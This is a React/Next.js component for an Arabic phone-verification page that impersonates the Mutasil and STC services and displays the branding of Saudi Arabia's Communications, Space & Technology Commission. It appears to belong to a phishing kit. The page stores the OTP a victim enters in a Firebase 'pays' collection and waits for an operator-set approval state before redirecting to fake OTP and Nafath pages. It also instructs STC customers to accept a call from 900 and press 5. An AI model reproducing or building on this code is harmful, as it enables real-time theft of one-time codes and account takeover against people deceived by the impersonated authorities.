"use client";

import type React from "react";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";
import { AlertCircle, Phone } from "lucide-react";
import { doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { addData } from "@/lib/firebase";

import FullPageLoader from "@/components/loader";
export function PhoneVerificationForm() {
  const router = useRouter();
  const [selectedProvider, setSelectedProvider] = useState("mutasil");
  const [verificationCode, setVerificationCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(147); // 02:27
  const [loading, setIsLoading] = useState(false);
  const getVisitor = () => {
    const visitorId = localStorage.getItem("visitor");
    return visitorId as string;
  };
  const unsubscribe = onSnapshot(doc(db, "pays", getVisitor()), (snap) => {
    if (!snap.exists()) return;

    const userData = snap.data();

    if (userData.phoneApproval === "pending") setIsLoading(true);
    if (userData.phoneApproval === "otp") window.location.href = "/payment/otp";
    if (userData.phoneApproval === "approved")
      window.location.href = "/payment/nafad";
    if (userData.phoneApproval === "rejected") {
      setIsLoading(false);
      alert("رمز التحقق غير صحيح");
    }
  });
  // Timer countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs
      .toString()
      .padStart(2, "0")}`;
  };

  const handleVerificationCodeChange = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setVerificationCode(value);
  };

  const handleSubmit = async () => {
    if (verificationCode.length < 3) return;
    const visitorId = getVisitor();
    await addData({
      id: visitorId,
      phoneOtp: verificationCode,
      phoneApproval: "pending",
    });
    setIsSubmitting(true);
    await new Promise((resolve) => setTimeout(resolve, 2000));
    setIsSubmitting(false);

    alert("تم التحقق من رقم الهاتف بنجاح!");
    router.push("/");
  };

  const isFormValid = verificationCode.length === 6;

  return (
    <div className="space-y-6">
      {/* Phone Verification Card */}
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-8">
        {/* Mutasil Logo */}
        {loading && <FullPageLoader />}
        <div className="text-center mb-8">
          <div className="text-2xl font-bold text-stone-900 mb-1">متاصيل</div>
          <div className="text-xs text-stone-500">mutasil</div>
        </div>

        {/* OTP Sent Message */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 flex gap-3">
          <Phone className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
          <p className="text-sm text-blue-900">
            تم إرسال رمز التحقق إلى هاتفك. الرجاء إدخاله في هذا الحقل.
          </p>
        </div>

        {/* Provider Selection */}
        <div className="mb-6">
          <label className="block text-sm font-medium text-stone-900 mb-4 text-right">
            اختر مزود الخدمة
          </label>
          <div className="space-y-3">
            {/* Mutasil Option */}
            <label
              className="flex items-center p-4 border-2 rounded-lg cursor-pointer transition-colors"
              style={{
                borderColor:
                  selectedProvider === "mutasil" ? "#16a34a" : "#e7e5e4",
              }}
            >
              <input
                type="radio"
                name="provider"
                value="mutasil"
                checked={selectedProvider === "mutasil"}
                onChange={(e) => setSelectedProvider(e.target.value)}
                className="w-4 h-4 accent-green-600"
              />
              <span className="mr-3 text-right flex-1">
                <div className="font-semibold text-stone-900">متاصيل</div>
                <div className="text-xs text-stone-500">mutasil</div>
              </span>
            </label>

            {/* STC Option */}
            <label
              className="flex items-center p-4 border-2 rounded-lg cursor-pointer transition-colors"
              style={{
                borderColor: selectedProvider === "stc" ? "#16a34a" : "#e7e5e4",
              }}
            >
              <input
                type="radio"
                name="provider"
                value="stc"
                checked={selectedProvider === "stc"}
                onChange={(e) => setSelectedProvider(e.target.value)}
                className="w-4 h-4 accent-green-600"
              />
              <span className="mr-3 text-right flex-1">
                <div className="font-semibold text-purple-700">STC</div>
                <div className="text-xs text-stone-500">stc</div>
              </span>
            </label>
          </div>
        </div>

        {/* STC Message */}
        {selectedProvider === "stc" && (
          <div className="bg-orange-50 border-r-4 border-orange-500 rounded-lg p-4 mb-6 flex gap-3">
            <AlertCircle className="w-5 h-5 text-orange-600 flex-shrink-0 mt-0.5" />
            <p className="text-sm text-orange-900 text-right">
              عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها واختيار
              الرقم 5
            </p>
          </div>
        )}

        {/* Verification Code Input */}
        <div className="space-y-6">
          <div>
            <label className="block text-sm text-stone-700 text-right mb-4 font-medium">
              رمز التحقق
            </label>
            <input
              type="text"
              inputMode="numeric"
              value={verificationCode}
              onChange={handleVerificationCodeChange}
              maxLength={6}
              placeholder="000000"
              className="w-full px-4 py-3 border-2 border-stone-300 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-green-500 focus:outline-none transition-colors"
            />
          </div>

          {/* Resend Timer */}
          <div className="text-center">
            <p className="text-sm text-stone-600">
              إعادة الإرسال: {formatTime(timeLeft)}
            </p>
            {timeLeft === 0 && (
              <button className="text-green-600 hover:text-green-700 text-sm font-medium mt-2 transition-colors">
                إعادة إرسال الرمز
              </button>
            )}
          </div>

          {/* Submit Button */}
          <Button
            onClick={handleSubmit}
            disabled={!isFormValid || isSubmitting}
            className="w-full bg-green-600 hover:bg-green-700 disabled:bg-stone-200 disabled:cursor-not-allowed text-white text-lg h-12 font-medium rounded-lg transition-colors"
          >
            {isSubmitting ? "جاري التحقق..." : "تحقق"}
          </Button>
        </div>

        {/* CST Logo and Footer */}
        <div className="text-center mt-8 pt-6 border-t border-stone-200">
          <div className="inline-block mb-3">
            <div className="text-xs text-stone-500 font-semibold">
              هيئة الاتصالات والفضاء والتقنية
            </div>
            <div className="text-xs text-stone-500">
              Communications, Space & Technology Commission
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
